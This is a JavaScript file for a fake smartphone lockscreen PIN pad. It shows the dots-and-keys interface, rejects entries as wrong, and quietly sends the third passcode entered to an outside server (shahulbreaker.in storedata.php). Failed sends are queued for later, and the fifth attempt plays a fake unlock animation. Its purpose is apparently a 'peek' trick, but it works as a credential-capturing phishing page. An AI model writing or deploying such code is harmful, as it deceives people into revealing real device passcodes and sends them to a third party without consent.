(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4; // matches your HTML (4 dots)
  let code = "";

  // Elements
  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const homescreenImg = document.getElementById('homescreenImg');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  // attempts storage
  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  // update dots UI
  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  // clear the current code input
  function reset() {
    code = "";
    refreshDots();
  }

  // queue on failed send
  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  // send to API (used only on 3rd attempt). returns promise.
  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
        // still resolve so caller doesn't hang
      });
  }

  // flush any queued passes when online
  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  // play unlock animation
  function playUnlockAnimation() {
    const lockEl = document.querySelector('.lockscreen');
    if (!lockEl || !unlockOverlay) return;
    lockEl.classList.add('unlocking');
    unlockOverlay.classList.add('show');
  }

  // animate wrong attempt: dots shake horizontally; reset WHEN shaking starts
  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }

    const DURATION = 700; // must match CSS animation duration (ms)

    // add the shake class
    dotsEl.classList.add('wrong');

    // reset dots immediately when shake starts so they clear while shaking
    reset();

    // remove class after animation ends
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
      // no second reset needed (already reset at start)
    }, DURATION + 20);
  }

  // Called after a full entry
  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // send only on 3rd attempt
    if (attempts === 3) {
      // fire-and-forget; errors queue internally
      sendToAPI(enteredCode);
      animateWrongAttempt();
    } else if (attempts === 5) {
      // open phone (play animation) on 5th attempt
      playUnlockAnimation();
      // clear dots shortly later so UI is neat (allow animation to show)
      setTimeout(reset, 300);
    } else {
      // attempts 1,2,4 -> show wrong animation
      animateWrongAttempt();
    }

    // reset attempt counter after 5th so cycle repeats
    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  // ---------- Key touch/press visual feedback (glow + pop) ----------

  // create the transient numeric popup (reused)
  const keyPop = document.createElement('div');
  keyPop.className = 'key-pop';
  document.body.appendChild(keyPop);

  // show popup above the given element with the digit
  function showKeyPopFor(el, digit) {
    if (!el) return;
    const rect = el.getBoundingClientRect();
    const cx = rect.left + rect.width / 2 + window.scrollX;
    const top = rect.top + window.scrollY; // top of key
    keyPop.textContent = digit;

    // position center above the key
    keyPop.style.left = cx + 'px';
    // nudge popup a bit above the key (the CSS transform handles vertical offset)
    keyPop.style.top = (top) + 'px';

    // trigger show
    keyPop.classList.add('show');

    // auto-hide after short delay
    clearTimeout(keyPop._hideTO);
    keyPop._hideTO = setTimeout(() => {
      keyPop.classList.remove('show');
    }, 220);
  }

  // add pointer handlers for visual pressed state
  function addPressFeedback(el) {
    if (!el) return;

    // pointerdown covers mouse/touch/pen
    el.addEventListener('pointerdown', (ev) => {
      // only left clicks / touches
      if (ev.pointerType === 'mouse' && ev.button !== 0) return;
      el.classList.add('pressed');

      // show numeric popup
      const digit = el.dataset.num;
      if (digit) showKeyPopFor(el, digit);
    }, { passive: true });

    // remove on pointerup / cancel / leave
    const remove = () => el.classList.remove('pressed');
    el.addEventListener('pointerup', remove, { passive: true });
    el.addEventListener('pointercancel', remove, { passive: true });
    el.addEventListener('pointerleave', remove, { passive: true });
    el.addEventListener('lostpointercapture', remove, { passive: true });
  }

  // attach to all keys
  keys.forEach(k => addPressFeedback(k));

  // numeric key handling (keeps existing behavior)
  keys.forEach(k => k.addEventListener('click', () => {
    const num = k.dataset.num;
    if (!num) return;
    if (code.length >= MAX) return;
    code += num;
    refreshDots();

    if (code.length === MAX) {
      const enteredCode = code;
      // let the last dot visually fill, then handle attempt
      setTimeout(() => {
        handleCompleteAttempt(enteredCode);
        // DO NOT call reset() here — animations will call reset after they finish
      }, 120);
    }
  }));

  // emergency: visual only
  emergency && emergency.addEventListener('click', e => e.preventDefault());

  // cancel clears input immediately
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  // expose for debug
  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
